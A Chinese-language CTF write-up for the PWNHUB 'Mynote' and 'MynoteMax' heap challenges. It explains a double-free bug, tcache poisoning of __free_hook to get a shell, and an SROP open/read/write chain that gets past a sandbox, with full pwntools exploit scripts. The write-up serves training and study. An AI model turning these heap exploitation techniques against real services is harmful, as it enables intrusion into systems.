> 原文链接: https://www.anquanke.com//post/id/246440 


# PWNHUB 七月公开赛 Mynote、MynoteMax Writeup


                                阅读量   
                                **132366**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t01ce5f8f91c89c90d4.jpg)](https://p0.ssl.qhimg.com/t01ce5f8f91c89c90d4.jpg)



由于是公开赛的缘故，两道题目都比较简单，第二道题目只是第一道题目加了一个沙箱。

我们这里着重分析第一题，然后再讲解如何利用在第一题的基础上构造出第二题。



## 程序分析

[![](https://p5.ssl.qhimg.com/t01b2d54ced43bc5fba.png)](https://p5.ssl.qhimg.com/t01b2d54ced43bc5fba.png)

这是一道堆的菜单题，分别有三个功能 Add、Show 和 Delete。

相对于常规的堆的菜单题，缺少了 Edit 功能，也就是只能在 Add 之后进行 Edit 编辑。

### <a class="reference-link" name="%E6%81%A2%E5%A4%8D%E7%A8%8B%E5%BA%8F%E7%AC%A6%E5%8F%B7"></a>恢复程序符号

这一点是我之前不重视的，但是现在发现其实这一点是非常重要的，这对于我们审题能够带来非常大的帮助。这就像磨刀不误砍柴工一样，花费一些时间去恢复程序的符号信息，能够让我们快速找到程序的漏洞，理解程序的运作流程。

我一般看堆的菜单题，优先看程序的菜单函数，了解到程序存在的所有功能，再利用菜单的选项来对各个功能函数进行命名。命名之后，就是找到 Show 函数，根据 Show 函数的输出信息来设置结构体，例如这道题。

[![](https://p4.ssl.qhimg.com/t01b8aee6cab454f565.png)](https://p4.ssl.qhimg.com/t01b8aee6cab454f565.png)

他的 Show 函数是这样的，但是实际上我们根据他给出的输出就可以整理一个整体的思路来确定各个结构体元素对应的意义。

例如他这里出现的

```
qword_202040 = (__int64)&amp;unk_202060 + 16 * v1;
```

我们就可以得知他是一个总长度为 16（0x10）的结构体，并且以 v1 作为索引来取得某个结构体的指针。

```
printf("| Size: %d\n", *(unsigned int *)qword_202040);
printf("| Content: %s", *(const char **)(qword_202040 + 8));
```

接下来又出现的是这两行，分别我们确定了 size 和 Content 指针存在的位置分别是 + 0 和 + 8，于是我们就可以根据已知的这个信息在 IDA 中建立一个结构体信息。

在这道题中，虽然储存 size 用的是 int （从 使用 %d 输出可以看出）应该只需要 0x4 个字节，但是估计为了对齐，所以实际上使用了 8 个字节。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014481518a422f85c5.png)

有了结构体之后，我们再根据 BSS 段上实际上占用的长度计算出结构体的长度，然后再回到函数中对变量类型进行修改，修改后我们的代码就变得简单易读，更加的接近源代码。

[![](https://p1.ssl.qhimg.com/t01f25269c483914fca.png)](https://p1.ssl.qhimg.com/t01f25269c483914fca.png)

### <a class="reference-link" name="Delete%20%E5%87%BD%E6%95%B0"></a>Delete 函数

一般来说如果是堆题的漏洞都是出现在两个功能函数中“Delete”函数和“Edit”函数。在 “Delete”函数中容易出现的漏洞就是 Free 之后不清 0 ；而“Edit”函数中最容易出现的就是 Off By One、Off By Null、堆溢出等漏洞。而这道题中不存在 Edit 函数，所以我们就直接来审 Delete 函数。

[![](https://p5.ssl.qhimg.com/t01ea8b7fecd8da3334.png)](https://p5.ssl.qhimg.com/t01ea8b7fecd8da3334.png)

果不其然，在这个函数中只 对 size 内容进行了清 0，但是没有对指针进行清 0，并且在进入判定的时候也没有判定是否指针已经被 free 过，这就造成了程序可能会出现 double free 的漏洞。我们这里再结合给出的远程 libc 判断出程序的 libc 版本是 **Ubuntu GLIBC 2.27-3ubuntu1**，这个版本是不存在 tcache double free 的检测的，所以我们可以直接利用 tcache double free 来劫持程序流程。

### <a class="reference-link" name="Add%20%E5%87%BD%E6%95%B0"></a>Add 函数

[![](https://p1.ssl.qhimg.com/t018515f8bf68c94938.png)](https://p1.ssl.qhimg.com/t018515f8bf68c94938.png)

Add 函数对 size 进行了限制，要求是在 0x80 到 0x3FF 之内的 size。这个要求很常规，要求小于 size 大于 0x7F 是为了考察 tcache 的利用，防止你使用 fastbin 来进行攻击；小于 0x400 是为了防止你使用 largebin 进行攻击。在做题的时候，也可以通过观察对 size 的限制来推出本题大概考察的是什么点，但是也不要因为 size 的限制而限制思维的发散。

### <a class="reference-link" name="Show%20%E5%87%BD%E6%95%B0"></a>Show 函数

[![](https://p3.ssl.qhimg.com/t017eb74b11d0807d08.png)](https://p3.ssl.qhimg.com/t017eb74b11d0807d08.png)

Show 函数一般是用来泄露 libc 地址的，在这道题中是用 printf 进行输出的，%s 遇到 00 数据会截断。但是在这道题中影响不到我们利用，不过我这里提及一下常见的的坑和解决办法。
1. 在 glibc2.31 某个版本中使用 unsorted bin 堆块 free 后 fd 指针指向的位置，某位字节恰好是 00 数据，这使得我们无法利用这个方法来泄露出 libc 地址，这个时候可以想办法让 unsorted bin 的数据进入到 small bin 中，这时候再 leak 就不是 00 数据结尾了。
1. 在有些题目中，会在 add 或 edit 功能读入 Content 数据的时候，使用 00 数据来截断，这使得这样的程序在 Show 函数的时候只能输出你输入的 Content 的数据，而无法输出更多的内容来 leak。
1. 在没有 Show 函数的题目和遇到 2 这样的情况，我一般是考虑使用 stdout 来 leak libc，这个方法相对来说也比较的容易，大家可以参考一下我的[这篇文章](http://blog.wjhwjhn.com/archives/95/)。


## 利用漏洞

这里主要的思路都是针对于这个小版本的 glibc 2.27，其中的很多操作在新版本中都新增了检测的手段，不适用于新版本，绕过方法可以看我的其他文章。

### <a class="reference-link" name="Leak"></a>Leak

leak 常见的是 **leak libc**、**leak heapbase**、**leak pie**、**leak stac**k 这四种。这里需要的是 leak libc 和 leak heapbase 这两种。

Leak Libc 在这道题中使用的方法是，让堆块进入到 unsortedbin 中，然后再 show，他的 fd 指针就可以泄露出 libc 的地址。而在有 tcache 的情况下，让堆块进入到 unsortedbin 的前提就是 tcache 已经满了，也就是 tcache 中已经存在了 7 个堆块。我这里就直接利用 double free 漏洞，构造出一个环形的链表（这时候 counts 是 2），再申请三次让 counts 的内容变成了 -1（0xFF），这时候 0xFF 就是大于 7 的，让接下来释放的堆块就可以进入到 unsortedbin 中。再 Show 一次就可以 leak libc。

Leak heapbase 要相对于简单一些，我们只需要利用 tcache 的 next 指针的残留，构造出一个 a -&gt; b，其中 b 也在 heap 空间上，再 Show 一次就可以 leak heapbase。像这道题由于存在 double free 漏洞直接构造出 a -&gt; a 即可。

### <a class="reference-link" name="%E5%8A%AB%E6%8C%81"></a>劫持

在这之前这两道题的做法可以是一样的，但是从这里开始就要考虑不同的做法。

由于 tcache 没有像 fastbin 那样对 size 位进行了检测，所以我们可以考虑 UAF 劫持 next 指针到__free_hook 这个钩子，并且申请两次拿出。这个钩子可以传递一个 rdi 参数，内容为将要 free 的堆块指针，可以便于我们的利用。

在 Mynote 这道题中，我们直接在__free_hook 上写上 system 函数，并且在要 free 的堆块上写入内容为”sh\x00”，这时候 free 这个堆块就相当于执行了 system(“sh”)，就可以成功拿到程序 shell。

由于 MynoteMax 这题开启来沙箱禁用了 execve 函数，所以我们需要用 orw 的手段来 get flag。

[![](https://p3.ssl.qhimg.com/t01735a765159df6fca.png)](https://p3.ssl.qhimg.com/t01735a765159df6fca.png)

在这个版本的 libc 中，我这里想到有两种方法来直接 orw。
1. 通过申请到 libc 中的 environ 来泄露出栈地址，再通过任意申请来申请到 Add 函数的返回地址那块栈空间，在 Add 函数中进行修改，并且在返回的时候执行 orw。
1. 通过劫持__free_hook 为 setcontext 来进行 SROP 来执行 orw。
这里我 EXP 中使用的是第二种方法

不过在这个版本中还没有进行修改，所以我们直接利用构造 SROP 来进行利用，关于具体的利用方法可以对照 exp 进行学习，或者看我的[这篇文章](http://blog.wjhwjhn.com/archives/155/)（在新版本（&gt;= 2.31）的 setcontext 函数中已经把传参的参数修改为 rdx，所以原来使用的 rdi 无法直接传参，需要寻找 gadget 来进行利用）

这里需要说明的是
1. 使用 SROP 并不一定需要泄露堆的地址，也可以直接把 SROP 的结构直接写在 __free_hook 附近的那段空间（注意不要覆盖到某些重要的钩子即可），在 free 的时候直接 free 那段空间。
1. 其实 ROP 中并不一定要 syscall，也可以直接调用 libc 中的函数，例如 open、read、write、puts、printf 这些函数也是可以的。但是需要注意的是 libc 中的 open 函数实际上在 syscall 的时候实际上使用的是 **257 sys_openat**，如果沙箱中明确只让使用 **2 sys_open** 的话还是老老实实的用 syscall 比较好。


## EXP

在第二题的 exp 中，由于写入 SROP 所需要的结构和 ROP 链的总大小超过 0x100 字节，所以我修改申请了 0x200 字节，基本的利用思路不变。

### **Mynote**

```
from pwn import *

elf = None
libc = None
file_name = "./My_note"
#context.timeout = 1


def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd `{``}`".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=&gt;")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc


def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
            return s.process(file_name)
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process(file_name)


def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address


def get_flag(sh):
    sh.recvrepeat(0.1)
    sh.sendline('cat flag')
    return sh.recvrepeat(0.3)


def get_gdb(sh, gdbscript=None, addr=0, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript=gdbscript)
    elif addr is not None:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(sh.pid)).readlines()[1], 16)
        log.success("breakpoint_addr --&gt; " + hex(text_base + addr))
        gdb.attach(sh, 'b *`{``}`'.format(hex(text_base + addr)))
    else:
        gdb.attach(sh)
    if stop:
        raw_input()


def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count &lt; 3:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag

def choice(idx):
    sh.sendlineafter("&gt; Your choice :", str(idx))


def add(size, content='sh\x00'):
    choice(1)
    sh.sendlineafter("size :", str(size))
    sh.sendafter("Content :", content)

def show(idx):
    choice(2)
    sh.sendlineafter("Index :", str(idx))


def delete(idx):
    choice(3)
    sh.sendlineafter("Index :", str(idx))


def pwn(sh, elf, libc):
    print libc.path
    context.log_level = "debug"
    add(0x100)
    add(0x100) #1
    add(0x100) #2
    delete(0)
    delete(0)
    add(0x100, '\x60')
    add(0x100, '\x60')
    add(0x100, '\x60')
    delete(1)
    show(1)
    libc_base = get_address(sh, True, info="libc_base:\t", offset=-0x3ebca0)
    libc.address = libc_base
    add(0x100, p64(libc.sym['__free_hook']))
    add(0x100, p64(libc.sym['system']))
    add(0x100, p64(libc.sym['system']))
    delete(2)
    sh.interactive()


if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
    sh.close()
    log.success('The flag is ' + re.search(r'flag`{`.+`}`', flag).group())
```

### <a class="reference-link" name="MynoteMax"></a>MynoteMax

```
from pwn import *

elf = None
libc = None
file_name = "./Mynote_Max"


# context.timeout = 1


def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd `{``}`".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=&gt;")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc


def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
            return s.process(file_name)
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process(file_name)


def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address


def get_flag(sh):
    sh.recvrepeat(0.1)
    sh.sendline('cat flag')
    return sh.recvrepeat(0.3)


def get_gdb(sh, gdbscript=None, addr=0, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript=gdbscript)
    elif addr is not None:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(sh.pid)).readlines()[1], 16)
        log.success("breakpoint_addr --&gt; " + hex(text_base + addr))
        gdb.attach(sh, 'b *`{``}`'.format(hex(text_base + addr)))
    else:
        gdb.attach(sh)
    if stop:
        raw_input()


def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count &lt; 3:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag


def choice(idx):
    sh.sendlineafter("&gt; Your choice :", str(idx))


def add(size, content='sh\x00'):
    choice(1)
    sh.sendlineafter("size :", str(size))
    sh.sendafter("Content :", content)


def show(idx):
    choice(2)
    sh.sendlineafter("Index :", str(idx))


def delete(idx):
    choice(3)
    sh.sendlineafter("Index :", str(idx))


def pwn(sh, elf, libc):
    print libc.path
    context.log_level = "debug"
    add(0x200)  # 0
    add(0x200)  # 1
    add(0x200)  # 2
    delete(0)
    delete(0)

    show(0)
    sh.recvuntil('Content: ')
    heap_addr = u64(sh.recvuntil('\x2b', drop=True)[-6:].ljust(8, '\x00'))
    log.success("heap_base:\t" + hex(heap_addr - 0x260))

    add(0x200, '\x60')  # 0
    add(0x200, '\x60')  # 3
    add(0x200, '\x60')  # 4
    delete(1)
    show(1)
    libc_base = get_address(sh, True, info="libc_base:\t", offset=-0x3ebca0)
    libc.address = libc_base


    # SROP

    pop_rdi_addr = libc_base + 0x2155f
    pop_rsi_addr = libc_base + 0x23e6a
    pop_rdx_addr = libc_base + 0x1b96
    pop_rax_addr = libc_base + 0x439c8
    syscall_ret_addr = libc_base + 0xd2975

    fake_frame_addr = heap_addr
    frame = SigreturnFrame()
    frame.rax = 2
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsi = 0
    frame.rdx = 0x100
    frame.rsp = fake_frame_addr + 0xF8 + 0x10
    frame.rip = pop_rdi_addr + 1  # : ret
    rop_data = [
        pop_rax_addr,  # sys_open('flag', 0)
        2,
        syscall_ret_addr,
        pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
        0,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_ret_addr,
        pop_rax_addr,  # sys_write(1, heap, 0x100)
        1,
        pop_rdi_addr,
        1,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_ret_addr
    ]
    add(0x200, p64(libc.sym['__free_hook']))  # 5
    add(0x200, str(frame).ljust(0xF8, '\x00') + 'flag' + '\x00' * (8 + 4) + flat(rop_data))  # 6
    add(0x200, p64(libc.sym['setcontext'] + 53))  # 7
    #gdb.attach(sh, "b *" + hex(libc.sym['setcontext'] + 53))
    delete(0)

    sh.interactive()


if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
    sh.close()
    log.success('The flag is ' + re.search(r'flag`{`.+`}`', flag).group())
```



## 总结

这次的公开赛的题目只能算是一个常规的堆题吧，对于新手入门 libc2.27 还是有很大的帮助的。所以本文的主要目的也不是在于介绍这道题上，而是借用这些题目为引，来简单的说说我做题的思路以及会遇到的一些坑，这些坑虽然看上去平平无奇，但在实际比赛中遇到总是会给人带来一丝紧张。如果提前了解了，那么在比赛过程中就是“知己知彼，百战不殆”。
